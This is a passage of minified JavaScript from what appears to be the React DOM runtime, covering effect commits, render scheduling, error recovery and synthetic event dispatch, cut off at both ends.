l=null;e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(l=e.memoizedState.cachePool.pool),e=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(e=t.memoizedState.cachePool.pool),e!==l&&(e!=null&&e.refCount++,l!=null&&Va(l))}function Cc(e,t){e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&Va(e))}function Ct(e,t,l,a){if(t.subtreeFlags&10256)for(t=t.child;t!==null;)nr(e,t,l,a),t=t.sibling}function nr(e,t,l,a){var n=t.flags;switch(t.tag){case 0:case 11:case 15:Ct(e,t,l,a),n&2048&&nn(9,t);break;case 1:Ct(e,t,l,a);break;case 3:Ct(e,t,l,a),n&2048&&(e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&Va(e)));break;case 12:if(n&2048){Ct(e,t,l,a),e=t.stateNode;try{var u=t.memoizedProps,i=u.id,c=u.onPostCommit;typeof c=="function"&&c(i,t.alternate===null?"mount":"update",e.passiveEffectDuration,-0)}catch(s){se(t,t.return,s)}}else Ct(e,t,l,a);break;case 31:Ct(e,t,l,a);break;case 13:Ct(e,t,l,a);break;case 23:break;case 22:u=t.stateNode,i=t.alternate,t.memoizedState!==null?u._visibility&2?Ct(e,t,l,a):cn(e,t):u._visibility&2?Ct(e,t,l,a):(u._visibility|=2,ga(e,t,l,a,(t.subtreeFlags&10256)!==0||!1)),n&2048&&Oc(i,t);break;case 24:Ct(e,t,l,a),n&2048&&Cc(t.alternate,t);break;default:Ct(e,t,l,a)}}function ga(e,t,l,a,n){for(n=n&&((t.subtreeFlags&10256)!==0||!1),t=t.child;t!==null;){var u=e,i=t,c=l,s=a,h=i.flags;switch(i.tag){case 0:case 11:case 15:ga(u,i,c,s,n),nn(8,i);break;case 23:break;case 22:var p=i.stateNode;i.memoizedState!==null?p._visibility&2?ga(u,i,c,s,n):cn(u,i):(p._visibility|=2,ga(u,i,c,s,n)),n&&h&2048&&Oc(i.alternate,i);break;case 24:ga(u,i,c,s,n),n&&h&2048&&Cc(i.alternate,i);break;default:ga(u,i,c,s,n)}t=t.sibling}}function cn(e,t){if(t.subtreeFlags&10256)for(t=t.child;t!==null;){var l=e,a=t,n=a.flags;switch(a.tag){case 22:cn(l,a),n&2048&&Oc(a.alternate,a);break;case 24:cn(l,a),n&2048&&Cc(a.alternate,a);break;default:cn(l,a)}t=t.sibling}}var sn=8192;function va(e,t,l){if(e.subtreeFlags&sn)for(e=e.child;e!==null;)ur(e,t,l),e=e.sibling}function ur(e,t,l){switch(e.tag){case 26:va(e,t,l),e.flags&sn&&e.memoizedState!==null&&Qy(l,Ot,e.memoizedState,e.memoizedProps);break;case 5:va(e,t,l);break;case 3:case 4:var a=Ot;Ot=Nu(e.stateNode.containerInfo),va(e,t,l),Ot=a;break;case 22:e.memoizedState===null&&(a=e.alternate,a!==null&&a.memoizedState!==null?(a=sn,sn=16777216,va(e,t,l),sn=a):va(e,t,l));break;default:va(e,t,l)}}function ir(e){var t=e.alternate;if(t!==null&&(e=t.child,e!==null)){t.child=null;do t=e.sibling,e.sibling=null,e=t;while(e!==null)}}function fn(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var l=0;l<t.length;l++){var a=t[l];Re=a,sr(a,e)}ir(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)cr(e),e=e.sibling}function cr(e){switch(e.tag){case 0:case 11:case 15:fn(e),e.flags&2048&&rl(9,e,e.return);break;case 3:fn(e);break;case 12:fn(e);break;case 22:var t=e.stateNode;e.memoizedState!==null&&t._visibility&2&&(e.return===null||e.return.tag!==13)?(t._visibility&=-3,vu(e)):fn(e);break;default:fn(e)}}function vu(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var l=0;l<t.length;l++){var a=t[l];Re=a,sr(a,e)}ir(e)}for(e=e.child;e!==null;){switch(t=e,t.tag){case 0:case 11:case 15:rl(8,t,t.return),vu(t);break;case 22:l=t.stateNode,l._visibility&2&&(l._visibility&=-3,vu(t));break;default:vu(t)}e=e.sibling}}function sr(e,t){for(;Re!==null;){var l=Re;switch(l.tag){case 0:case 11:case 15:rl(8,l,t);break;case 23:case 22:if(l.memoizedState!==null&&l.memoizedState.cachePool!==null){var a=l.memoizedState.cachePool.pool;a!=null&&a.refCount++}break;case 24:Va(l.memoizedState.cache)}if(a=l.child,a!==null)a.return=l,Re=a;else e:for(l=e;Re!==null;){a=Re;var n=a.sibling,u=a.return;if(Io(a),a===l){Re=null;break e}if(n!==null){n.return=u,Re=n;break e}Re=u}}}var uy={getCacheForType:function(e){var t=Ye(De),l=t.data.get(e);return l===void 0&&(l=e(),t.data.set(e,l)),l},cacheSignal:function(){return Ye(De).controller.signal}},iy=typeof WeakMap=="function"?WeakMap:Map,ne=0,me=null,W=null,$=0,ce=0,st=null,dl=!1,pa=!1,_c=!1,Ft=0,Te=0,hl=0,Xl=0,Dc=0,ft=0,Sa=0,on=null,Ie=null,Hc=!1,pu=0,fr=0,Su=1/0,bu=null,yl=null,xe=0,ml=null,ba=null,$t=0,Nc=0,Mc=null,or=null,rn=0,xc=null;function ot(){return(ne&2)!==0&&$!==0?$&-$:S.T!==null?Yc():zs()}function rr(){if(ft===0)if(($&536870912)===0||ee){var e=Dn;Dn<<=1,(Dn&3932160)===0&&(Dn=262144),ft=e}else ft=536870912;return e=it.current,e!==null&&(e.flags|=32),ft}function Pe(e,t,l){(e===me&&(ce===2||ce===9)||e.cancelPendingCommit!==null)&&(Ta(e,0),gl(e,$,ft,!1)),Ma(e,l),((ne&2)===0||e!==me)&&(e===me&&((ne&2)===0&&(Xl|=l),Te===4&&gl(e,$,ft,!1)),Ut(e))}function dr(e,t,l){if((ne&6)!==0)throw Error(y(327));var a=!l&&(t&127)===0&&(t&e.expiredLanes)===0||Na(e,t),n=a?fy(e,t):Rc(e,t,!0),u=a;do{if(n===0){pa&&!a&&gl(e,t,0,!1);break}else{if(l=e.current.alternate,u&&!cy(l)){n=Rc(e,t,!1),u=!1;continue}if(n===2){if(u=t,e.errorRecoveryDisabledLanes&u)var i=0;else i=e.pendingLanes&-536870913,i=i!==0?i:i&536870912?536870912:0;if(i!==0){t=i;e:{var c=e;n=on;var s=c.current.memoizedState.isDehydrated;if(s&&(Ta(c,i).flags|=256),i=Rc(c,i,!1),i!==2){if(_c&&!s){c.errorRecoveryDisabledLanes|=u,Xl|=u,n=4;break e}u=Ie,Ie=n,u!==null&&(Ie===null?Ie=u:Ie.push.apply(Ie,u))}n=i}if(u=!1,n!==2)continue}}if(n===1){Ta(e,0),gl(e,t,0,!0);break}e:{switch(a=e,u=n,u){case 0:case 1:throw Error(y(345));case 4:if((t&4194048)!==t)break;case 6:gl(a,t,ft,!dl);break e;case 2:Ie=null;break;case 3:case 5:break;default:throw Error(y(329))}if((t&62914560)===t&&(n=pu+300-tt(),10<n)){if(gl(a,t,ft,!dl),Nn(a,0,!0)!==0)break e;$t=t,a.timeoutHandle=Xr(hr.bind(null,a,l,Ie,bu,Hc,t,ft,Xl,Sa,dl,u,"Throttled",-0,0),n);break e}hr(a,l,Ie,bu,Hc,t,ft,Xl,Sa,dl,u,null,-0,0)}}break}while(!0);Ut(e)}function hr(e,t,l,a,n,u,i,c,s,h,p,T,m,g){if(e.timeoutHandle=-1,T=t.subtreeFlags,T&8192||(T&16785408)===16785408){T={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:jt},ur(t,u,T);var _=(u&62914560)===u?pu-tt():(u&4194048)===u?fr-tt():0;if(_=Vy(T,_),_!==null){$t=u,e.cancelPendingCommit=_(Tr.bind(null,e,t,u,l,a,n,i,c,s,p,T,null,m,g)),gl(e,u,i,!h);return}}Tr(e,t,u,l,a,n,i,c,s)}function cy(e){for(var t=e;;){var l=t.tag;if((l===0||l===11||l===15)&&t.flags&16384&&(l=t.updateQueue,l!==null&&(l=l.stores,l!==null)))for(var a=0;a<l.length;a++){var n=l[a],u=n.getSnapshot;n=n.value;try{if(!nt(u(),n))return!1}catch{return!1}}if(l=t.child,t.subtreeFlags&16384&&l!==null)l.return=t,t=l;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function gl(e,t,l,a){t&=~Dc,t&=~Xl,e.suspendedLanes|=t,e.pingedLanes&=~t,a&&(e.warmLanes|=t),a=e.expirationTimes;for(var n=t;0<n;){var u=31-at(n),i=1<<u;a[u]=-1,n&=~i}l!==0&&Ts(e,l,t)}function Tu(){return(ne&6)===0?(dn(0),!1):!0}function Uc(){if(W!==null){if(ce===0)var e=W.return;else e=W,Lt=Rl=null,Wi(e),ra=null,Ka=0,e=W;for(;e!==null;)Qo(e.alternate,e),e=e.return;W=null}}function Ta(e,t){var l=e.timeoutHandle;l!==-1&&(e.timeoutHandle=-1,_y(l)),l=e.cancelPendingCommit,l!==null&&(e.cancelPendingCommit=null,l()),$t=0,Uc(),me=e,W=l=Yt(e.current,null),$=t,ce=0,st=null,dl=!1,pa=Na(e,t),_c=!1,Sa=ft=Dc=Xl=hl=Te=0,Ie=on=null,Hc=!1,(t&8)!==0&&(t|=t&32);var a=e.entangledLanes;if(a!==0)for(e=e.entanglements,a&=t;0<a;){var n=31-at(a),u=1<<n;t|=e[n],a&=~u}return Ft=t,Gn(),l}function yr(e,t){V=null,S.H=tn,t===oa||t===Fn?(t=Hf(),ce=3):t===Bi?(t=Hf(),ce=4):ce=t===rc?8:t!==null&&typeof t=="object"&&typeof t.then=="function"?6:1,st=t,W===null&&(Te=1,ou(e,mt(t,e.current)))}function mr(){var e=it.current;return e===null?!0:($&4194048)===$?St===null:($&62914560)===$||($&536870912)!==0?e===St:!1}function gr(){var e=S.H;return S.H=tn,e===null?tn:e}function vr(){var e=S.A;return S.A=uy,e}function Au(){Te=4,dl||($&4194048)!==$&&it.current!==null||(pa=!0),(hl&134217727)===0&&(Xl&134217727)===0||me===null||gl(me,$,ft,!1)}function Rc(e,t,l){var a=ne;ne|=2;var n=gr(),u=vr();(me!==e||$!==t)&&(bu=null,Ta(e,t)),t=!1;var i=Te;e:do try{if(ce!==0&&W!==null){var c=W,s=st;switch(ce){case 8:Uc(),i=6;break e;case 3:case 2:case 9:case 6:it.current===null&&(t=!0);var h=ce;if(ce=0,st=null,Aa(e,c,s,h),l&&pa){i=0;break e}break;default:h=ce,ce=0,st=null,Aa(e,c,s,h)}}sy(),i=Te;break}catch(p){yr(e,p)}while(!0);return t&&e.shellSuspendCounter++,Lt=Rl=null,ne=a,S.H=n,S.A=u,W===null&&(me=null,$=0,Gn()),i}function sy(){for(;W!==null;)pr(W)}function fy(e,t){var l=ne;ne|=2;var a=gr(),n=vr();me!==e||$!==t?(bu=null,Su=tt()+500,Ta(e,t)):pa=Na(e,t);e:do try{if(ce!==0&&W!==null){t=W;var u=st;t:switch(ce){case 1:ce=0,st=null,Aa(e,t,u,1);break;case 2:case 9:if(_f(u)){ce=0,st=null,Sr(t);break}t=function(){ce!==2&&ce!==9||me!==e||(ce=7),Ut(e)},u.then(t,t);break e;case 3:ce=7;break e;case 4:ce=5;break e;case 7:_f(u)?(ce=0,st=null,Sr(t)):(ce=0,st=null,Aa(e,t,u,7));break;case 5:var i=null;switch(W.tag){case 26:i=W.memoizedState;case 5:case 27:var c=W;if(i?nd(i):c.stateNode.complete){ce=0,st=null;var s=c.sibling;if(s!==null)W=s;else{var h=c.return;h!==null?(W=h,Eu(h)):W=null}break t}}ce=0,st=null,Aa(e,t,u,5);break;case 6:ce=0,st=null,Aa(e,t,u,6);break;case 8:Uc(),Te=6;break e;default:throw Error(y(462))}}oy();break}catch(p){yr(e,p)}while(!0);return Lt=Rl=null,S.H=a,S.A=n,ne=l,W!==null?0:(me=null,$=0,Gn(),Te)}function oy(){for(;W!==null&&!Ud();)pr(W)}function pr(e){var t=Go(e.alternate,e,Ft);e.memoizedProps=e.pendingProps,t===null?Eu(e):W=t}function Sr(e){var t=e,l=t.alternate;switch(t.tag){case 15:case 0:t=jo(l,t,t.pendingProps,t.type,void 0,$);break;case 11:t=jo(l,t,t.pendingProps,t.type.render,t.ref,$);break;case 5:Wi(t);default:Qo(l,t),t=W=gf(t,Ft),t=Go(l,t,Ft)}e.memoizedProps=e.pendingProps,t===null?Eu(e):W=t}function Aa(e,t,l,a){Lt=Rl=null,Wi(t),ra=null,Ka=0;var n=t.return;try{if(Ih(e,n,t,l,$)){Te=1,ou(e,mt(l,e.current)),W=null;return}}catch(u){if(n!==null)throw W=n,u;Te=1,ou(e,mt(l,e.current)),W=null;return}t.flags&32768?(ee||a===1?e=!0:pa||($&536870912)!==0?e=!1:(dl=e=!0,(a===2||a===9||a===3||a===6)&&(a=it.current,a!==null&&a.tag===13&&(a.flags|=16384))),br(t,e)):Eu(t)}function Eu(e){var t=e;do{if((t.flags&32768)!==0){br(t,dl);return}e=t.return;var l=ty(t.alternate,t,Ft);if(l!==null){W=l;return}if(t=t.sibling,t!==null){W=t;return}W=t=e}while(t!==null);Te===0&&(Te=5)}function br(e,t){do{var l=ly(e.alternate,e);if(l!==null){l.flags&=32767,W=l;return}if(l=e.return,l!==null&&(l.flags|=32768,l.subtreeFlags=0,l.deletions=null),!t&&(e=e.sibling,e!==null)){W=e;return}W=e=l}while(e!==null);Te=6,W=null}function Tr(e,t,l,a,n,u,i,c,s){e.cancelPendingCommit=null;do zu();while(xe!==0);if((ne&6)!==0)throw Error(y(327));if(t!==null){if(t===e.current)throw Error(y(177));if(u=t.lanes|t.childLanes,u|=Ai,Xd(e,l,u,i,c,s),e===me&&(W=me=null,$=0),ba=t,ml=e,$t=l,Nc=u,Mc=n,or=a,(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?(e.callbackNode=null,e.callbackPriority=0,yy(Cn,function(){return Cr(),null})):(e.callbackNode=null,e.callbackPriority=0),a=(t.flags&13878)!==0,(t.subtreeFlags&13878)!==0||a){a=S.T,S.T=null,n=O.p,O.p=2,i=ne,ne|=4;try{ay(e,t,l)}finally{ne=i,O.p=n,S.T=a}}xe=1,Ar(),Er(),zr()}}function Ar(){if(xe===1){xe=0;var e=ml,t=ba,l=(t.flags&13878)!==0;if((t.subtreeFlags&13878)!==0||l){l=S.T,S.T=null;var a=O.p;O.p=2;var n=ne;ne|=4;try{lr(t,e);var u=Zc,i=cf(e.containerInfo),c=u.focusedElem,s=u.selectionRange;if(i!==c&&c&&c.ownerDocument&&uf(c.ownerDocument.documentElement,c)){if(s!==null&&vi(c)){var h=s.start,p=s.end;if(p===void 0&&(p=h),"selectionStart"in c)c.selectionStart=h,c.selectionEnd=Math.min(p,c.value.length);else{var T=c.ownerDocument||document,m=T&&T.defaultView||window;if(m.getSelection){var g=m.getSelection(),_=c.textContent.length,B=Math.min(s.start,_),de=s.end===void 0?B:Math.min(s.end,_);!g.extend&&B>de&&(i=de,de=B,B=i);var r=nf(c,B),f=nf(c,de);if(r&&f&&(g.rangeCount!==1||g.anchorNode!==r.node||g.anchorOffset!==r.offset||g.focusNode!==f.node||g.focusOffset!==f.offset)){var d=T.createRange();d.setStart(r.node,r.offset),g.removeAllRanges(),B>de?(g.addRange(d),g.extend(f.node,f.offset)):(d.setEnd(f.node,f.offset),g.addRange(d))}}}}for(T=[],g=c;g=g.parentNode;)g.nodeType===1&&T.push({element:g,left:g.scrollLeft,top:g.scrollTop});for(typeof c.focus=="function"&&c.focus(),c=0;c<T.length;c++){var b=T[c];b.element.scrollLeft=b.left,b.element.scrollTop=b.top}}ju=!!Vc,Zc=Vc=null}finally{ne=n,O.p=a,S.T=l}}e.current=t,xe=2}}function Er(){if(xe===2){xe=0;var e=ml,t=ba,l=(t.flags&8772)!==0;if((t.subtreeFlags&8772)!==0||l){l=S.T,S.T=null;var a=O.p;O.p=2;var n=ne;ne|=4;try{$o(e,t.alternate,t)}finally{ne=n,O.p=a,S.T=l}}xe=3}}function zr(){if(xe===4||xe===3){xe=0,Rd();var e=ml,t=ba,l=$t,a=or;(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?xe=5:(xe=0,ba=ml=null,Or(e,e.pendingLanes));var n=e.pendingLanes;if(n===0&&(yl=null),Iu(l),t=t.stateNode,lt&&typeof lt.onCommitFiberRoot=="function")try{lt.onCommitFiberRoot(Ha,t,void 0,(t.current.flags&128)===128)}catch{}if(a!==null){t=S.T,n=O.p,O.p=2,S.T=null;try{for(var u=e.onRecoverableError,i=0;i<a.length;i++){var c=a[i];u(c.value,{componentStack:c.stack})}}finally{S.T=t,O.p=n}}($t&3)!==0&&zu(),Ut(e),n=e.pendingLanes,(l&261930)!==0&&(n&42)!==0?e===xc?rn++:(rn=0,xc=e):rn=0,dn(0)}}function Or(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,Va(t)))}function zu(){return Ar(),Er(),zr(),Cr()}function Cr(){if(xe!==5)return!1;var e=ml,t=Nc;Nc=0;var l=Iu($t),a=S.T,n=O.p;try{O.p=32>l?32:l,S.T=null,l=Mc,Mc=null;var u=ml,i=$t;if(xe=0,ba=ml=null,$t=0,(ne&6)!==0)throw Error(y(331));var c=ne;if(ne|=4,cr(u.current),nr(u,u.current,i,l),ne=c,dn(0,!1),lt&&typeof lt.onPostCommitFiberRoot=="function")try{lt.onPostCommitFiberRoot(Ha,u)}catch{}return!0}finally{O.p=n,S.T=a,Or(e,t)}}function _r(e,t,l){t=mt(l,t),t=oc(e.stateNode,t,2),e=sl(e,t,2),e!==null&&(Ma(e,2),Ut(e))}function se(e,t,l){if(e.tag===3)_r(e,e,l);else for(;t!==null;){if(t.tag===3){_r(t,e,l);break}else if(t.tag===1){var a=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof a.componentDidCatch=="function"&&(yl===null||!yl.has(a))){e=mt(l,e),l=Do(2),a=sl(t,l,2),a!==null&&(Ho(l,a,t,e),Ma(a,2),Ut(a));break}}t=t.return}}function wc(e,t,l){var a=e.pingCache;if(a===null){a=e.pingCache=new iy;var n=new Set;a.set(t,n)}else n=a.get(t),n===void 0&&(n=new Set,a.set(t,n));n.has(l)||(_c=!0,n.add(l),e=ry.bind(null,e,t,l),t.then(e,e))}function ry(e,t,l){var a=e.pingCache;a!==null&&a.delete(t),e.pingedLanes|=e.suspendedLanes&l,e.warmLanes&=~l,me===e&&($&l)===l&&(Te===4||Te===3&&($&62914560)===$&&300>tt()-pu?(ne&2)===0&&Ta(e,0):Dc|=l,Sa===$&&(Sa=0)),Ut(e)}function Dr(e,t){t===0&&(t=bs()),e=Ml(e,t),e!==null&&(Ma(e,t),Ut(e))}function dy(e){var t=e.memoizedState,l=0;t!==null&&(l=t.retryLane),Dr(e,l)}function hy(e,t){var l=0;switch(e.tag){case 31:case 13:var a=e.stateNode,n=e.memoizedState;n!==null&&(l=n.retryLane);break;case 19:a=e.stateNode;break;case 22:a=e.stateNode._retryCache;break;default:throw Error(y(314))}a!==null&&a.delete(t),Dr(e,l)}function yy(e,t){return Ju(e,t)}var Ou=null,Ea=null,jc=!1,Cu=!1,Bc=!1,vl=0;function Ut(e){e!==Ea&&e.next===null&&(Ea===null?Ou=Ea=e:Ea=Ea.next=e),Cu=!0,jc||(jc=!0,gy())}function dn(e,t){if(!Bc&&Cu){Bc=!0;do for(var l=!1,a=Ou;a!==null;){if(e!==0){var n=a.pendingLanes;if(n===0)var u=0;else{var i=a.suspendedLanes,c=a.pingedLanes;u=(1<<31-at(42|e)+1)-1,u&=n&~(i&~c),u=u&201326741?u&201326741|1:u?u|2:0}u!==0&&(l=!0,xr(a,u))}else u=$,u=Nn(a,a===me?u:0,a.cancelPendingCommit!==null||a.timeoutHandle!==-1),(u&3)===0||Na(a,u)||(l=!0,xr(a,u));a=a.next}while(l);Bc=!1}}function my(){Hr()}function Hr(){Cu=jc=!1;var e=0;vl!==0&&Cy()&&(e=vl);for(var t=tt(),l=null,a=Ou;a!==null;){var n=a.next,u=Nr(a,t);u===0?(a.next=null,l===null?Ou=n:l.next=n,n===null&&(Ea=l)):(l=a,(e!==0||(u&3)!==0)&&(Cu=!0)),a=n}xe!==0&&xe!==5||dn(e),vl!==0&&(vl=0)}function Nr(e,t){for(var l=e.suspendedLanes,a=e.pingedLanes,n=e.expirationTimes,u=e.pendingLanes&-62914561;0<u;){var i=31-at(u),c=1<<i,s=n[i];s===-1?((c&l)===0||(c&a)!==0)&&(n[i]=Gd(c,t)):s<=t&&(e.expiredLanes|=c),u&=~c}if(t=me,l=$,l=Nn(e,e===t?l:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),a=e.callbackNode,l===0||e===t&&(ce===2||ce===9)||e.cancelPendingCommit!==null)return a!==null&&a!==null&&Wu(a),e.callbackNode=null,e.callbackPriority=0;if((l&3)===0||Na(e,l)){if(t=l&-l,t===e.callbackPriority)return t;switch(a!==null&&Wu(a),Iu(l)){case 2:case 8:l=ps;break;case 32:l=Cn;break;case 268435456:l=Ss;break;default:l=Cn}return a=Mr.bind(null,e),l=Ju(l,a),e.callbackPriority=t,e.callbackNode=l,t}return a!==null&&a!==null&&Wu(a),e.callbackPriority=2,e.callbackNode=null,2}function Mr(e,t){if(xe!==0&&xe!==5)return e.callbackNode=null,e.callbackPriority=0,null;var l=e.callbackNode;if(zu()&&e.callbackNode!==l)return null;var a=$;return a=Nn(e,e===me?a:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),a===0?null:(dr(e,a,t),Nr(e,tt()),e.callbackNode!=null&&e.callbackNode===l?Mr.bind(null,e):null)}function xr(e,t){if(zu())return null;dr(e,t,!0)}function gy(){Dy(function(){(ne&6)!==0?Ju(vs,my):Hr()})}function Yc(){if(vl===0){var e=sa;e===0&&(e=_n,_n<<=1,(_n&261888)===0&&(_n=256)),vl=e}return vl}function Ur(e){return e==null||typeof e=="symbol"||typeof e=="boolean"?null:typeof e=="function"?e:Rn(""+e)}function Rr(e,t){var l=t.ownerDocument.createElement("input");return l.name=t.name,l.value=t.value,e.id&&l.setAttribute("form",e.id),t.parentNode.insertBefore(l,t),e=new FormData(e),l.parentNode.removeChild(l),e}function vy(e,t,l,a,n){if(t==="submit"&&l&&l.stateNode===n){var u=Ur((n[Ke]||null).action),i=a.submitter;i&&(t=(t=i[Ke]||null)?Ur(t.formAction):i.getAttribute("formAction"),t!==null&&(u=t,i=null));var c=new Yn("action","action",null,a,n);e.push({event:c,listeners:[{instance:null,listener:function(){if(a.defaultPrevented){if(vl!==0){var s=i?Rr(n,i):new FormData(n);nc(l,{pending:!0,data:s,method:n.method,action:u},null,s)}}else typeof u=="function"&&(c.preventDefault(),s=i?Rr(n,i):new FormData(n),nc(l,{pending:!0,data:s,method:n.method,action:u},u,s))},currentTarget:n}]})}}for(var qc=0;qc<Ti.length;qc++){var Lc=Ti[qc],py=Lc.toLowerCase(),Sy=Lc[0].toUpperCase()+Lc.slice(1);zt(py,"on"+Sy)}zt(of,"onAnimationEnd"),zt(rf,"onAnimationIteration"),zt(df,"onAnimationStart"),zt("dblclick","onDoubleClick"),zt("focusin","onFocus"),zt("focusout","onBlur"),zt(wh,"onTransitionRun"),zt(jh,"onTransitionStart"),zt(Bh,"onTransitionCancel"),zt(hf,"onTransitionEnd"),Jl("onMouseEnter",["mouseout","mouseover"]),Jl("onMouseLeave",["mouseout","mouseover"]),Jl("onPointerEnter",["pointerout","pointerover"]),Jl("onPointerLeave",["pointerout","pointerover"]),_l("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),_l("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),_l("onBeforeInput",["compositionend","keypress","textInput","paste"]),_l("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),_l("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),_l("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var hn="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),by=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(hn));function wr(e,t){t=(t&4)!==0;for(var l=0;l<e.length;l++){var a=e[l],n=a.event;a=a.listeners;e:{var u=void 0;if(t)for(var i=a.length-1;0<=i;i--){var c=a[i],s=c.instance,h=c.currentTarget;if(c=c.listener,s!==u&&n.isPropagationStopped())break e;u=c,n.currentTarget=h;try{u(n)}catch(p){kn(p)}n.currentTarget=null,u=s}else for(i=0;i<a.length;i++){if(c=a[i],s=c.instance,h=c.currentTarget,c=c.listener,s!==u&&n.isPropagationStopped())break e;u=c,n.currentTarget=h;try{u(n)}catch(p){kn(p)}n.currentTarget=null,u=s}}}}function F(e,t){var l=t[Pu];l===void 0&&(l=t[Pu]=new Set);var a=e+"__bubble";l.has(a)||(jr(t,e,2,!1),l.add(a))}function kc(e,t,l){var a=0;t&&(a|=4),jr(l,e,a,t)}var _u="_reactListening"+Math.random().toString(36).slice(2);function Gc(e){if(!e[_u]){e[_u]=!0,_s.forEach(function(l){l!=="selectionchange"&&(by.has(l)||kc(l,!1,e),kc(l,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[_u]||(t[_u]=!0,kc("selectionchange",!1,t))}}function jr(e,t,l,a){switch(rd(t)){case 2:var n=Jy;break;case 8:n=Wy;break;default:n=as}l=n.bind(null,t,l,e),n=void 0,!si||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(n=!0),a?n!==void 0?e.addEventListener(t,l,{capture:!0,passive:n}):e.addEventListener(t,l,!0):n!==void 0?e.addEventListener(t,l,{passive:n}):e.addEventListener(t,l,!1)}function Xc(e,t,l,a,n){var u=a;if((t&1)===0&&(t&2)===0&&a!==null)e:for(;;){if(a===null)return;var i=a.tag;if(i===3||i===4){var c=a.stateNode.containerInfo;if(c===n)break;if(i===4)for(i=a.return;i!==null;){var s=i.tag;if((s===3||s===4)&&i.stateNode.containerInfo===n)return;i=i.return}for(;c!==null;){if(i=Vl(c),i===null)return;if(s=i.tag,s===5||s===6||s===26||s===27){a=u=i;continue e}c=c.parentNode}}a=a.return}qs(function(){var h=u,p=ii(l),T=[];e:{var m=yf.get(e);if(m!==void 0){var g=Yn,_=e;switch(e){case"keypress":if(jn(l)===0)break e;case"keydown":case"keyup":g=hh;break;case"focusin":_="focus",g=di;break;case"focusout":_="blur",g=di;break;case"beforeblur":case"afterblur":g=di;break;case"click":if(l.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":g=Gs;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":g=th;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":g=gh;break;case of:case rf:case df:g=nh;break;case hf:g=ph;break;case"scroll":case"scrollend":g=Pd;break;case"wheel":g=bh;break;case"copy":case"cut":case"paste":g=ih;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":g=Qs;break;case"toggle":case"beforetoggle":g=Ah}var B=(t&4)!==0,de=!B&&(e==="scroll"||e==="scrollend"),r=B?m!==null?m+"Capture":null:m;B=[];for(var f=h,d;f!==null;){var b=f;if(d=b.stateNode,b=b.tag,b!==5&&b!==26&&b!==27||d===null||r===null||(b=Ra(f,r),b!=null&&B.push(yn(f,b,d))),de)break;f=f.return}0<B.length&&(m=new g(m,_,null,l,p),T.push({event:m,listeners:B}))}}if((t&7)===0){e:{if(m=e==="mouseover"||e==="pointerover",g=e==="mouseout"||e==="pointerout",m&&l!==ui&&(_=l.relatedTarget||l.fromElement)&&(Vl(_)||_[Ql]))break e;if((g||m)&&(m=p.window===p?p:(m=p.ownerDocument)?m.defaultView||m.parentWindow:window,g?(_=l.relatedTarget||l.toElement,g=h,_=_?Vl(_):null,_!==null&&(de=K(_),B=_.tag,_!==de||B!==5&&B!==27&&B!==6)&&(_=null)):(g=null,_=h),g!==_)){if(B=Gs,b="onMouseLeave",r="onMouseEnter",f="mouse",(e==="pointerout"||e==="pointerover")&&(B=Qs,b="onPointerLeave",r="onPointerEnter",f="pointer"),de=g==null?m:Ua(g),d=_==null?m:Ua(_),m=new B(b,f+"leave",g,l,p),m.target=de,m.relatedTarget=d,b=null,Vl(p)===h&&(B=new B(r,f+"enter",_,l,p),B.target=d,B.relatedTarget=de,b=B),de=b,g&&_)t:{for(B=Ty,r=g,f=_,d=0,b=r;b;b=B(b))d++;b=0;for(var w=f;w;w=B(w))b++;for(;0<d-b;)r=B(r),d--;for(;0<b-d;)f=B(f),b--;for(;d--;){if(r===f||f!==null&&r===f.alternate){B=r;break t}r=B(r),f=B(f)}B=null}else B=null;g!==null&&Br(T,m,g,B,!1),_!==null&&de!==null&&Br(T,de,_,B,!0)}}e:{if(m=h?Ua(h):window,g=m.nodeName&&m.nodeName.toLowerCase(),g==="select"||g==="input"&&m.type==="file")var te=Is;else if(Fs(m))if(Ps)te=xh;else{te=Nh;var N=Hh}else g=m.nodeName,!g||g.toLowerCase()!=="input"||m.type!=="checkbox"&&m.type!=="radio"?h&&ni(h.elementType)&&(te=Is):te=Mh;if(te&&(te=te(e,h))){$s(T,te,l,p);break 